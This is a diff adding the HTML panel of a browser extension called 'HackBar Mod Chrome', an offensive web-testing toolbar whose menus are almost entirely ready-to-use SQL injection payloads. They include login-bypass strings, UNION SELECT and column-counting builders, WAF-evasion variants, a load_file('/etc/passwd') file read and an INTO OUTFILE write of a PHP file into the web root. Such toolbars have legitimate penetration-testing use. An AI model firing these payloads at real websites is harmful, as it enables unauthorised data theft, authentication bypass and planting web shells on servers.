@@ -1,0 +1,200 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>HackBar Mod Chrome by bosalem</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app">
+  <div class="toolbar">
+
+    <div class="menu">
+      <button class="menu-btn">SQLi</button>
+      <div class="dropdown">
+
+       <div class="item has-sub">Basic statements
+          <div class="submenu">
+
+            <div class="item has-sub">comment
+              <div class="submenu">
+                <div class="item payload" data-full="'" data-replace="'">'</div>
+                <div class="item payload" data-full="&quot;" data-replace="&quot;">&quot;</div>
+                <div class="item payload" data-full="&#92;" data-replace="&#92;">&#92;</div>
+                <div class="item payload" data-full=")" data-replace=")">)</div>
+                <div class="item payload" data-full=")?" data-replace=")?">)?</div>
+                <div class="item payload" data-full="‘)" data-replace="‘)">‘)</div>
+              </div>
+            </div>
+
+            <div class="item has-sub">boolean
+              <div class="submenu">
+                <div class="item payload" data-full="+AND+1=1--" data-replace="+AND+1=1--">+AND+1=1--</div>
+                <div class="item payload" data-full="+AND+1=2--" data-replace="+AND+1=2--">+AND+1=2--</div>
+                <div class="item payload" data-full="+OR+1=1--" data-replace="+OR+1=1--">+OR+1=1--</div>
+              </div>
+            </div>
+
+            <div class="item has-sub">Auth bypass
+              <div class="submenu wide">
+                <div class="item payload" data-full="133337' OR 1 = 1" data-replace="133337' OR 1 = 1">133337' OR 1 = 1</div>
+                <div class="item payload" data-full="' OR 1 = 1 --" data-replace="' OR 1 = 1 --">' OR 1 = 1 --</div>
+                <div class="item payload" data-full="' OR '1'='1' --" data-replace="' OR '1'='1' --">' OR '1'='1' --</div>
+                <div class="item payload" data-full="' OR '1' = '1" data-replace="' OR '1' = '1">' OR '1' = '1</div>
+                <div class="item payload" data-full="' OR 1 = 1 #" data-replace="' OR 1 = 1 #">' OR 1 = 1 #</div>
+                <div class="item payload" data-full="' OR 1=1 /*" data-replace="' OR 1=1 /*">' OR 1=1 /*</div>
+                <div class="item payload" data-full="' OR username LIKE '%' --" data-replace="' OR username LIKE '%' --">' OR username LIKE '%' --</div>
+                <div class="item payload" data-full="admin' or true" data-replace="admin' or true">admin' or true</div>
+                <div class="item payload" data-full="admin' --" data-replace="admin' --">admin' --</div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+		
+        <div class="item has-sub">Column count
+          <div class="submenu">
+            <div class="item action" data-action="dynamic-order-by">ORDER BY custom...</div>
+            <div class="item payload" data-full="+GROUP+BY+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100+--+-" data-replace="+GROUP+BY+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100+--+-">GROUP BY</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">Union statement
+          <div class="submenu">
+            <div class="item action" data-action="dynamic-union-select">UNION SELECT custom...</div>
+            <div class="item action" data-action="dynamic-union-select-null">UNION SELECT NULL custom...</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">Databases
+          <div class="submenu">
+            <div class="item payload" data-full="database()" data-replace="database()">database()</div>
+            <div class="item payload" data-full="version()" data-replace="version()">version()</div>
+            <div class="item payload" data-full="@@version" data-replace="@@version">@@version</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">Tables
+          <div class="submenu">
+            <div class="item action" data-action="dynamic-table-name-column">table_name</div>
+            <div class="item action" data-action="dynamic-table-group-concat-column">GROUP_CONCAT</div>
+            <div class="item action" data-action="dynamic-table-database-column">database</div>
+            <div class="item action" data-action="dynamic-table-split-column">split</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">Columns
+          <div class="submenu">
+            <div class="item action" data-action="dynamic-column-name-column">column_name</div>
+            <div class="item action" data-action="dynamic-column-group-concat-column">GROUP_CONCAT</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">Data
+          <div class="submenu">
+            <div class="item action" data-action="dynamic-data-column">data</div>
+            <div class="item action" data-action="dynamic-all-database-column">all database</div>
+          </div>
+        </div>
+
+
+      </div>
+    </div>
+
+    <div class="menu">
+      <button class="menu-btn">%URL</button>
+      <div class="dropdown small">
+        <div class="item tool" data-tool="urlEncode">URL Encode</div>
+        <div class="item tool" data-tool="urlDecode">URL Decode</div>
+        <div class="item tool" data-tool="b64Encode">BASE64 Encode</div>
+        <div class="item tool" data-tool="b64Decode">BASE64 Decode</div>
+        <div class="item tool" data-tool="hexEncode">HEX Encode</div>
+        <div class="item tool" data-tool="hexDecode">HEX Decode</div>
+      </div>
+    </div>
+
+    <div class="menu">
+      <button class="menu-btn">WAF</button>
+      <div class="dropdown small">
+
+        <div class="item has-sub">comment
+          <div class="submenu">
+            <div class="item payload" data-full="/**/OR/**/1=1+--+-" data-replace="/**/OR/**/1=1">/**/OR/**/1=1+--+-</div>
+            <div class="item payload" data-full="%20OR%201=1--%20-" data-replace="%20OR%201=1">%20OR%201=1--%20-</div>
+            <div class="item payload" data-full="%09OR%091=1--%09-" data-replace="%09OR%091=1">%09OR%091=1--%09-</div>
+            <div class="item payload" data-full="%0aOR%0a1=1--%0a-" data-replace="%0aOR%0a1=1">%0aOR%0a1=1--%0a-</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">order by
+          <div class="submenu">
+            <div class="item payload" data-full="‎OR/**/DE/**/R+B<>Y" data-replace="‎OR/**/DE/**/R+B<>Y">‎OR/**/DE/**/R+B<>Y</div>
+            <div class="item payload" data-full="OrDeR+By" data-replace="OrDeR+By">OrDeR+By</div>
+            <div class="item payload" data-full="/**/ORDER/**/BY/**/" data-replace="/**/ORDER/**/BY/**/">/**/ORDER/**/BY/**/</div>
+            <div class="item payload" data-full="6f726465722b6279" data-replace="6f726465722b6279">Hex encode</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">union select
+          <div class="submenu">
+            <div class="item payload" data-full="‎‎UN/**/I/**/ON+‎SE/**/L/**/ECT" data-replace="‎UN/**/I/**/ON+‎SE/**/L/**/ECT">‎UN/**/I/**/ON+‎SE/**/L/**/ECT</div>
+            <div class="item payload" data-full="‎U<>N/**/I/**/O<>N+‎U<>SE/**/LE/**/C<>T" data-replace="‎U<>N/**/I/**/O<>N+‎U<>SE/**/LE/**/C<>T">‎U<>N/**/I/**/O<>N+‎U<>SE/**/LE/**/C<>T</div>
+            <div class="item payload" data-full="U<>N/**/I/**/O<>N+SE<>L/**/E/**/C<>T" data-replace="U<>N/**/I/**/O<>N+SE<>L/**/E/**/C<>T">U<>N/**/I/**/O<>N+SE<>L/**/E/**/C<>T</div>
+            <div class="item payload" data-full="%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT%2f%2a%2a%2f" data-replace="%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT%2f%2a%2a%2f">Hex encode</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+
+    <div class="menu">
+      <button class="menu-btn">Shell</button>
+      <div class="dropdown small">
+
+        <div class="item has-sub">load file
+          <div class="submenu">
+            <div class="item payload" data-full="load_file('/etc/passwd')" data-replace="load_file('/etc/passwd')">load_file('/etc/passwd')</div>
+          </div>
+        </div>
+
+        <div class="item has-sub">out file
+          <div class="submenu wide">
+            <div class="item payload" data-full="+INTO+OUTFILE+'/var/www/html/pescyte.php'" data-replace="+INTO+OUTFILE+'/var/www/html/pescyte.php'">+INTO+OUTFILE+'/var/www/html/pescyte.php'</div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+
+    <div class="menu">
+      <button class="menu-btn">Privilege</button>
+      <div class="dropdown small">
+        <div class="item payload" data-full="current_user()" data-replace="current_user()">current user</div>
+		<div class="item payload" data-full="user()" data-replace="user()">user</div>
+        <div class="item action" data-action="dynamic-privilege-type-column">privilege type</div>
+        <div class="item payload" data-full="@@secure_file_priv" data-replace="@@secure_file_priv">privilege file</div>
+      </div>
+    </div>
+
+
+  </div>
+
+  <div class="workbench">
+    <div class="button-column">
+      <button id="execute" class="green">Execute</button>
+      <button id="loadUrl" class="blue">Load URL</button>
+      <button id="clear" class="red">Clear</button>
+    </div>
+    <textarea id="payload" spellcheck="false"></textarea>
+  </div>
+
+
+
+</div>
+
+<script src="panel.js"></script>
+</body>
+</html>
